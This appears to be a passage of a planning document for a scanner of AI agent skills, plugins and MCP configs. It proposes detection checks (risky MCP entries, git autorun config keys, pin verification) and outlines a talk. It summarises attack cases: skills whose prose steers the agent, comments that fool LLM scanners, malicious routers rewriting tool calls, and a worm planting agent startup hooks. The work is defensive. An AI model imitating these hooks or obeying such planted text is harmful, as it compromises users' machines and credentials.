- runs `mcp-remote` below 0.1.16 (CVE-2025-6514)
- connects to a remote `url` over plain `http://` to a non-loopback host
- carries `env` with secrets inline in a project-scope file

**Why:** SANDWORM_MODE (2026-02) planted entries of exactly this shape across five hosts. OX Security
(2026-04): stdio config is a command line. CVE-2026-42271 (KEV 2026-06-08) is the server-side version.

**Notes:** runs on inventory output, so it reuses the existing MCP parsers.

### 9. `checks/git_autorun.py`, executable git config in downloaded folders (S)

**Detects:** when a scanned target contains `.git/`, read `.git/config` and `.gitattributes`, and flag:

- `core.fsmonitor`, `core.hooksPath`, `core.sshCommand`
- `filter.*.clean|smudge|process`, `diff.*.textconv`, `uploadpack.packObjectsHook`
- executable files in `.git/hooks/` that are not `.sample`
- a `commondir` or `gitdir` file pointing outside the target

This needs a narrow exception to `SKIP_DIRS` for those few files only.

**Why:** Codex CVE-2026-19590 to 19593 (2026-09-01, ZDI-26-651). Background git ran these with no
trust prompt. Claude Code CVE-2026-40068 (spoofed `commondir`). Skills and plugins are routinely shared
as zips that include `.git`.

### 10. `lock` / `verify`, prove the bytes, not the ref (M, extends the planned subcommand)

**Detects:**
- On `lock`, record the resolved commit *and* a content hash of the tree.
- On `verify`, recompute both; refuse when `git rev-parse HEAD` differs from the pinned SHA.
- Warn when any branch or tag name in the clone is 40 hex characters.
- When `skill.oms.sig` exists, verify it offline with `model_signing verify certificate` against a
  user-supplied chain and report signed / unsigned / mismatched / extra unsigned files.

**Why:** CVE-2026-86063 (2026-10-15): Claude Code's plugin pin was beaten by a branch named like the
SHA. The Zenity bait-and-switch (clean listing, malicious update) and ClawHub's 43.91% multi-version
drift are what diff-on-update must surface. NVIDIA's OMS signing is the one live skill-signing scheme.

**Notes:** keep `model-signing` an optional extra like `[yara]`. No network: the certificate chain is a
file the user provides.

---

## Not ranked, one line each

- Claude Code auto-memory (`~/.claude/projects/*/memory/`) as an inventory location. This is cheap, but
  no in-the-wild memory-poisoning case was found in the window (arXiv:2606.04329 is lab work).
- IDE extension directories (`~/.vscode/extensions`, `~/.cursor/extensions`, `~/.windsurf/extensions`,
  `~/.vscode-oss/extensions`) for GlassWASM-class threats. This is outside unpick's AI-component scope;
  listing them with publisher IDs would at least enable the cross-registry impersonation check.
- `recover` runbook content from this window:
  - remove dead-man persistence (`gh-token-monitor` LaunchAgent/systemd/ONLOGON) *before* revoking a
    GitHub token (tensorlake)
  - rotate at each provider, not in a gateway (OpenCode Console)
  - clear OAuth credentials stored before MCP TS SDK 1.31.0, since they lack `issuer`
    (GHSA-6qxp-vccf-f47h)
- Adversarial corpus: add `trailofbits/overtly-malicious-skills` and the Zenity IOC skill names
  (`paperclip`, `paperclip-board`, `para-memory-files`, `design-guide`, `browser-use-headless-skill`)
  as named negatives.

## For the talk: the three items most worth showing

1. **CHAINDROP / tensorlake (2026-08-04, 2026-10-08).** An npm worm that writes `.claude/settings.json`
   `SessionStart` and `.vscode/tasks.json` `folderOpen` into your repos, authored as `claude`. Opening
   the folder is the infection. It fits "The Devil Wears Markdown" if you widen it to JSON, and it is
   current. Honest beat: unpick 0.1.0 scores it 0 today, and addition 1 fixes that on stage.
2. **Zenity's skills.sh campaign (July 2026, 1.7M installs).** A clean SKILL.md, a malicious
   `references/setup-installation.md`, prose telling the agent to avoid npm, and a bait-and-switch after
   the listing reached Trending. It shows why "read the raw bytes" must include every file the skill
   *points to*, and why pinning plus diff-on-update matters.
3. **Trail of Bits, "The sorry state of skill distribution" (2026-06-03).** They beat every marketplace
   scanner and Cisco's with padding, a `.pyc` that differs from its source, a `.docx`, and comments that
   persuade the LLM scanner. It supports the talk's thesis that a flag is a question, not a verdict, and
   that a clean scan is not proof.

Strong runner-up: **"Your Agent Is Mine" (arXiv:2604.08407).** Malicious LLM routers rewrote tool calls,
17 touched canary AWS keys, and 401 of 440 hijacked Codex sessions were already in YOLO mode. One
config line (`*_BASE_URL`) is the whole attack surface.
